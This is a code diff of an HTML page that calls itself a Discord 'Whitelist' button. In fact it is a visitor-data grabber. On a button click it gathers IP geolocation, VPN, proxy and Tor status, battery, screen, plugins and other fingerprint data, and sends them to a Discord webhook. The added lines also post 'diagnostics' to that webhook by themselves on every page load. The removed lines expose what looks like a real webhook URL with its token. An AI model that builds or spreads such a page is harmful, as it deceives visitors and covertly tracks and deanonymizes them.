@@ -3,207 +3,123 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <meta name="referrer" content="no-referrer" />
   <title>Whitelist Button</title>
   <style>
-    :root { --bg: #f9fafb; --ok: #10b981; --ok2: #059669; --muted: #9ca3af; --border: #ccc; }
-    body { font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; min-height: 100vh; background: var(--bg); padding: 1rem; }
-    input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid var(--border); }
-    button { background: var(--ok); color: white; border: none; cursor: pointer; }
-    button:disabled { background: var(--muted); cursor: not-allowed; }
-    button:hover:enabled { background: var(--ok2); }
-    details { max-width: 720px; width: 100%; }
-    pre { background: #fff; border: 1px solid var(--border); border-radius: 8px; padding: 0.75rem; max-height: 300px; overflow: auto; }
-    .row { display: flex; gap: .5rem; width: 100%; max-width: 720px; align-items: center; }
-    .row > * { flex: 1; }
+    body { font-family: sans-serif; display: flex; flex-direction: column; gap: 1rem; align-items: center; justify-content: center; height: 100vh; background: #f9fafb; }
+    input, button { padding: 0.6rem 1rem; font-size: 1rem; border-radius: 8px; border: 1px solid #ccc; }
+    button { background: #10b981; color: white; border: none; cursor: pointer; }
+    button:disabled { background: #9ca3af; cursor: not-allowed; }
+    button:hover:enabled { background: #059669; }
   </style>
 </head>
 <body>
-  <div class="row">
-    <input type="text" id="discordId" placeholder="Enter Discord User ID" />
-    <button id="whitelistBtn" disabled>Whitelist</button>
-  </div>
-
-  <details>
-    <summary>Run tests / diagnostics</summary>
-    <div style="display:flex; gap:.5rem; margin:.5rem 0;">
-      <button id="runTestsBtn">Run Tests</button>
-      <label><input type="checkbox" id="forceMock"> Force mock network</label>
-    </div>
-    <pre id="testLog" aria-live="polite"></pre>
-  </details>
+  <input type="text" id="discordId" placeholder="Enter Discord User ID" />
+  <button id="whitelistBtn" disabled>Whitelist</button>
 
   <script>
-    // ===== Config =====
-    const CONFIG = {
-      WEBHOOK_URL: 'https://discord.com/api/webhooks/1400234987541893260/U0Oi5nji0bljkiODyK8pd_9excATVoTFoFkqp1vc2ksKrZCbp3IpuUU6JuXQs1SUVPqr',
-      RATE_LIMIT_HOURS: 24,
-      // Mock conditions for sandboxed/test environments; add ?mock=1 to URL to force
-      ENABLE_MOCK: new URLSearchParams(location.search).get('mock') === '1',
-      // If a real fetch fails (CORS / sandbox), automatically fall back to mock success
-      MOCK_ON_NETWORK_FAILURE: true,
-    };
-
-    // ===== Elements =====
+    const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';
     const whitelistBtn = document.getElementById('whitelistBtn');
     const discordIdInput = document.getElementById('discordId');
-    const runTestsBtn = document.getElementById('runTestsBtn');
-    const testLog = document.getElementById('testLog');
-    const forceMock = document.getElementById('forceMock');
-
-    // ===== Utilities for older browsers =====
-    function toArray(listLike) {
-      try { return Array.prototype.slice.call(listLike || []); } catch (_) { return []; }
-    }
-    function nowIso() { try { return new Date().toISOString(); } catch (_) { return new Date() + ''; }
-    }
-    function safeTimeZone() {
-      try { return Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : null; } catch (_) { return null; }
-    }
-
-    // ===== Rate limit helpers =====
+    const RATE_LIMIT_HOURS = 24;
     const STORAGE_KEY = 'lastWhitelistTime';
-    function isRateLimited() {
-      try {
-        const lastTime = localStorage.getItem(STORAGE_KEY);
-        if (!lastTime) return false;
-        const diffHrs = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
-        return diffHrs < CONFIG.RATE_LIMIT_HOURS;
-      } catch (_) { return false; }
-    }
 
-    // Toggle button by numeric input (Discord IDs are numeric snowflakes)
+    // Auto-run diagnostics on every visit
+    window.addEventListener('load', () => runDiagnostics());
+
     discordIdInput.addEventListener('input', () => {
-      const value = (discordIdInput.value || '').trim();
+      const value = discordIdInput.value.trim();
       const isNumeric = /^\d+$/.test(value);
       whitelistBtn.disabled = !isNumeric;
     });
 
-    if (isRateLimited()) whitelistBtn.disabled = true;
-
-    // ===== Network helpers (mock-aware) =====
-    const MOCK_IP = {
-      ip: '203.0.113.42', city: 'Testville', region: 'Example', country: 'US', org: 'TEST-AS',
-      asn: 'AS65535', country_name: 'United States',
-      privacy: { vpn: false, proxy: false, tor: false },
-      security: { vpn: false, proxy: false, tor: false }
-    };
-
-    function shouldMock() {
-      return CONFIG.ENABLE_MOCK || (forceMock && forceMock.checked) || false;
+    function isRateLimited() {
+      const lastTime = localStorage.getItem(STORAGE_KEY);
+      if (!lastTime) return false;
+      const diff = (Date.now() - parseInt(lastTime, 10)) / (1000 * 60 * 60);
+      return diff < RATE_LIMIT_HOURS;
     }
 
-    async function fetchIpInfo() {
-      if (shouldMock()) return { ok: true, data: MOCK_IP };
+    async function runDiagnostics() {
+      const results = { passed: [], errors: [], critical: [] };
+
+      // Test LocalStorage
       try {
-        const res = await fetch('https://ipapi.co/json/');
-        if (!res.ok) return { ok: false, error: 'ipapi response not ok: ' + res.status };
-        const data = await res.json();
-        return { ok: true, data };
-      } catch (e) {
-        return { ok: false, error: String(e && e.message || e) };
+        localStorage.setItem('diag_test', '1');
+        localStorage.removeItem('diag_test');
+        results.passed.push('LocalStorage works');
+      } catch {
+        results.critical.push('LocalStorage unavailable');
       }
-    }
 
-    async function postToDiscord(formData) {
-      if (shouldMock()) return { ok: true, status: 204, mocked: true };
-      // First attempt: normal fetch
+      // Test UserAgent
+      if (navigator.userAgent) results.passed.push('UserAgent available');
+      else results.critical.push('UserAgent missing');
+
+      // Battery API
       try {
-        const res = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: formData, keepalive: true });
-        return res;
-      } catch (e1) {
-        // Second attempt: no-cors to avoid strict CORS in some Android in-app browsers.
-        try {
-          const res2 = await fetch(CONFIG.WEBHOOK_URL, { method: 'POST', body: formData, mode: 'no-cors', keepalive: true });
-          // In no-cors, status is opaque; treat as success for UX if allowed.
-          if (CONFIG.MOCK_ON_NETWORK_FAILURE) return { ok: true, status: 0, opaque: true };
-          return res2;
-        } catch (e2) {
-          if (CONFIG.MOCK_ON_NETWORK_FAILURE) return { ok: true, status: 0, mocked: true };
-          throw e2;
+        if (navigator.getBattery) {
+          const b = await navigator.getBattery();
+          results.passed.push('Battery API supported');
+        } else {
+          results.errors.push('Battery API not supported');
         }
+      } catch {
+        results.errors.push('Battery API failed');
       }
-    }
 
-    // ===== Capability helpers =====
-    async function safeGetBattery() {
-      try { return navigator.getBattery ? await navigator.getBattery() : null; } catch (_) { return null; }
-    }
-    async function safeClipboardPermission() {
-      try { return navigator.permissions ? await navigator.permissions.query({ name: 'clipboard-read' }) : null; } catch (_) { return null; }
-    }
-
-    function extractPrivacy(geo) {
-      // Support both ipapi.co (security) and ipapi.com (privacy) shapes
-      const sec = geo && geo.security ? geo.security : null;
-      const prv = geo && geo.privacy ? geo.privacy : null;
-      return {
-        vpn: sec ? !!sec.vpn : (prv ? !!prv.vpn : null),
-        proxy: sec ? !!sec.proxy : (prv ? !!prv.proxy : null),
-        tor: sec ? !!sec.tor : (prv ? !!prv.tor : null),
-      };
-    }
-
-    function buildPayload(geoData, battery, clipboardPerm) {
-      return {
-        timestamp: nowIso(),
-        discordUserId: (discordIdInput.value || '').trim(),
-        userAgent: navigator.userAgent || null,
-        language: navigator.language || null,
-        languages: navigator.languages || [],
-        platform: navigator.platform || null,
-        cookieEnabled: (typeof navigator.cookieEnabled !== 'undefined') ? navigator.cookieEnabled : null,
-        online: (typeof navigator.onLine !== 'undefined') ? navigator.onLine : null,
-        screen: (typeof screen !== 'undefined' && screen) ? {
-          width: screen.width,
-          height: screen.height,
-          availWidth: screen.availWidth,
-          availHeight: screen.availHeight,
-          colorDepth: screen.colorDepth,
-          pixelDepth: screen.pixelDepth
-        } : null,
-        referrer: document.referrer || null,
-        page: (typeof location !== 'undefined' && location) ? location.href : null,
-        timezone: safeTimeZone(),
-        connection: (navigator.connection) ? {
-          effectiveType: navigator.connection.effectiveType,
-          downlink: navigator.connection.downlink,
-          rtt: navigator.connection.rtt
-        } : null,
-        hardwareConcurrency: (typeof navigator.hardwareConcurrency !== 'undefined') ? navigator.hardwareConcurrency : null,
-        deviceMemory: (typeof navigator.deviceMemory !== 'undefined') ? navigator.deviceMemory : null,
-        maxTouchPoints: (typeof navigator.maxTouchPoints !== 'undefined') ? navigator.maxTouchPoints : 0,
-        doNotTrack: (typeof navigator.doNotTrack !== 'undefined') ? navigator.doNotTrack : null,
-        vendor: navigator.vendor || null,
-        product: navigator.product || null,
-        productSub: navigator.productSub || null,
-        javaEnabled: (typeof navigator.javaEnabled === 'function') ? navigator.javaEnabled() : null,
-        plugins: navigator.plugins ? toArray(navigator.plugins).map(p => p && p.name).filter(Boolean) : [],
-        mimeTypes: navigator.mimeTypes ? toArray(navigator.mimeTypes).map(m => m && m.type).filter(Boolean) : [],
-        battery: battery ? {
-          charging: !!battery.charging,
-          level: battery.level,
-          chargingTime: battery.chargingTime,
-          dischargingTime: battery.dischargingTime
-        } : null,
-        clipboardPermission: clipboardPerm ? clipboardPerm.state : null,
-        ipInfo: geoData || {},
-        ...extractPrivacy(geoData)
-      };
-    }
-
-    function buildFormData(payload) {
-      const fd = new FormData();
-      // Attach file when possible; otherwise include JSON in content fallback.
-      let contentText = `Visitor data from Discord User ID: ${payload.discordUserId}`;
+      // Permissions API
       try {
-        const blob = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
-        fd.append('file', blob, 'visitor_data.json');
-      } catch (_) {
-        contentText += '\n\nPayload (blob unsupported): ' + JSON.stringify(payload, null, 2);
+        if (navigator.permissions) {
+          await navigator.permissions.query({ name: 'clipboard-read' }).catch(()=>{});
+          results.passed.push('Permissions API supported');
+        } else results.errors.push('Permissions API not supported');
+      } catch {
+        results.errors.push('Permissions API failed');
       }
-      fd.append('content', contentText);
-      return fd;
+
+      // Screen check
+      if (screen && screen.width > 0) results.passed.push('Screen info valid');
+      else results.errors.push('Screen info missing');
+
+      // Connection check
+      if (navigator.connection) results.passed.push('Network info available');
+      else results.errors.push('Network info missing');
+
+      // Timezone check
+      try {
+        const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        if (tz) results.passed.push('Timezone detected');
+        else results.errors.push('Timezone missing');
+      } catch {
+        results.errors.push('Timezone check failed');
+      }
+
+      // Do Not Track
+      if (navigator.doNotTrack != null) results.passed.push('Do Not Track reported');
+      else results.errors.push('Do Not Track unavailable');
+
+      // Plugins
+      try {
+        const count = navigator.plugins.length;
+        results.passed.push(`Plugins detected: ${count}`);
+      } catch {
+        results.errors.push('Plugins check failed');
+      }
+
+      const totalTests = results.passed.length + results.errors.length + results.critical.length;
+      const score = `${results.passed.length}/${totalTests}`;
+
+      const diagPayload = {
+        timestamp: new Date().toISOString(),
+        diagnostics: { score, ...results }
+      };
+
+      const formData = new FormData();
+      const file = new Blob([JSON.stringify(diagPayload, null, 2)], { type: 'application/json' });
+      formData.append('file', file, 'diagnostics_results.json');
+      formData.append('content', 'Automatic diagnostics report');
+
+      try { await fetch(WEBHOOK_URL, { method: 'POST', body: formData }); } catch {}
     }
 
     async function sendData() {
@@ -211,98 +127,80 @@
         alert('You can only whitelist once every 24 hours.');
         return;
       }
-
-      // Gather data
-      const [ipRes, battery, clipboardPerm] = await Promise.all([
-        fetchIpInfo(),
-        safeGetBattery(),
-        safeClipboardPermission()
-      ]);
-
-      const geoData = ipRes.ok ? ipRes.data : { error: ipRes.error || 'IP lookup failed' };
-      const payload = buildPayload(geoData, battery, clipboardPerm);
-      const formData = buildFormData(payload);
-
-      // Post to Discord
-      let res;
       try {
-        res = await postToDiscord(formData);
-      } catch (err) {
-        console.error('Fetch error details (unhandled):', err);
-        alert('Network/Fetch error: ' + (err && err.message ? err.message : err));
-        return;
-      }
+        const geoRes = await fetch('https://ipapi.co/json/');
+        const geoData = geoRes.ok ? await geoRes.json() : {};
 
-      if (res && res.ok) {
-        alert('Data sent successfully.');
-        try { localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch (_) {}
-        whitelistBtn.disabled = true;
-      } else {
-        // Treat opaque 0 status as success when MOCK_ON_NETWORK_FAILURE is true
-        if (res && res.status === 0 && CONFIG.MOCK_ON_NETWORK_FAILURE) {
-          alert('Data sent (opaque).');
-          try { localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch (_) {}
+        const battery = navigator.getBattery ? await navigator.getBattery() : null;
+        const clipboardPerm = navigator.permissions ? await navigator.permissions.query({ name: 'clipboard-read' }).catch(() => null) : null;
+
+        const payload = {
+          timestamp: new Date().toISOString(),
+          discordUserId: discordIdInput.value.trim(),
+          userAgent: navigator.userAgent,
+          language: navigator.language,
+          languages: navigator.languages,
+          platform: navigator.platform,
+          cookieEnabled: navigator.cookieEnabled,
+          online: navigator.onLine,
+          screen: {
+            width: screen.width,
+            height: screen.height,
+            availWidth: screen.availWidth,
+            availHeight: screen.availHeight,
+            colorDepth: screen.colorDepth,
+            pixelDepth: screen.pixelDepth
+          },
+          referrer: document.referrer || null,
+          page: location.href,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+          } : null,
+          hardwareConcurrency: navigator.hardwareConcurrency,
+          deviceMemory: navigator.deviceMemory || null,
+          maxTouchPoints: navigator.maxTouchPoints,
+          doNotTrack: navigator.doNotTrack,
+          vendor: navigator.vendor,
+          product: navigator.product,
+          productSub: navigator.productSub,
+          javaEnabled: navigator.javaEnabled ? navigator.javaEnabled() : null,
+          plugins: Array.from(navigator.plugins).map(p => p.name),
+          mimeTypes: Array.from(navigator.mimeTypes).map(m => m.type),
+          battery: battery ? {
+            charging: battery.charging,
+            level: battery.level,
+            chargingTime: battery.chargingTime,
+            dischargingTime: battery.dischargingTime
+          } : null,
+          clipboardPermission: clipboardPerm ? clipboardPerm.state : null,
+          ipInfo: geoData
+        };
+
+        const formData = new FormData();
+        const file = new Blob([JSON.stringify(payload, null, 2)], { type: 'application/json' });
+        formData.append('file', file, 'visitor_data.json');
+        formData.append('content', `Visitor data from Discord User ID: ${discordIdInput.value.trim()}`);
+
+        const res = await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+
+        if (res.ok) {
+          alert('Data sent successfully.');
+          localStorage.setItem(STORAGE_KEY, Date.now().toString());
           whitelistBtn.disabled = true;
-          return;
+        } else {
+          alert(`Failed to send data. Status: ${res.status}`);
         }
-        alert('Failed to send data. Status: ' + (res ? res.status : 'No response'));
+      } catch (err) {
+        alert('Error sending data: ' + err.message);
       }
     }
+
+    if (isRateLimited()) whitelistBtn.disabled = true;
 
     whitelistBtn.addEventListener('click', sendData);
-
-    // ===== Simple Test Harness =====
-    function log(line) { testLog.textContent += (line + '\n'); }
-    function assert(name, cond) { log((cond ? '✅ ' : '❌ ') + name); if (!cond) throw new Error('Test failed: ' + name); }
-
-    async function runTests() {
-      testLog.textContent = '';
-      log('Running tests...');
-      const originalValue = discordIdInput.value;
-      const originalAlert = window.alert;
-      let alertMsg = '';
-      window.alert = (m) => { alertMsg = String(m); log('ALERT: ' + alertMsg); };
-      try {
-        // 1) Input enables button only for numeric
-        discordIdInput.value = 'not-numeric';
-        discordIdInput.dispatchEvent(new Event('input'));
-        assert('Button disabled on non-numeric', whitelistBtn.disabled === true);
-        discordIdInput.value = '123456789012345678';
-        discordIdInput.dispatchEvent(new Event('input'));
-        assert('Button enabled on numeric', whitelistBtn.disabled === false);
-
-        // 2) Rate limit logic
-        try { localStorage.setItem(STORAGE_KEY, Date.now().toString()); } catch (_) {}
-        assert('isRateLimited true after setting now', isRateLimited() === true);
-        // clear for next tests
-        try { localStorage.removeItem(STORAGE_KEY); } catch (_) {}
-
-        // 3) Payload has expected keys and privacy fields
-        const ip = await fetchIpInfo();
-        const payload = buildPayload(ip.ok ? ip.data : {}, null, null);
-        assert('Payload has discordUserId', typeof payload.discordUserId === 'string');
-        assert('Payload includes ipInfo', typeof payload.ipInfo === 'object');
-        assert('Payload has vpn/proxy/tor keys', 'vpn' in payload && 'proxy' in payload && 'tor' in payload);
-
-        // 4) Mocked send succeeds
-        forceMock.checked = true;
-        discordIdInput.value = '222222222222222222';
-        discordIdInput.dispatchEvent(new Event('input'));
-        await sendData();
-        assert('Alert indicated success in mock', /Data sent|opaque/.test(alertMsg));
-
-        log('All tests passed.');
-      } catch (e) {
-        log('Test failure: ' + (e && e.message ? e.message : e));
-      } finally {
-        forceMock.checked = false;
-        discordIdInput.value = originalValue;
-        discordIdInput.dispatchEvent(new Event('input'));
-        window.alert = originalAlert;
-      }
-    }
-
-    if (runTestsBtn) runTestsBtn.addEventListener('click', runTests);
   </script>
 </body>
 </html>
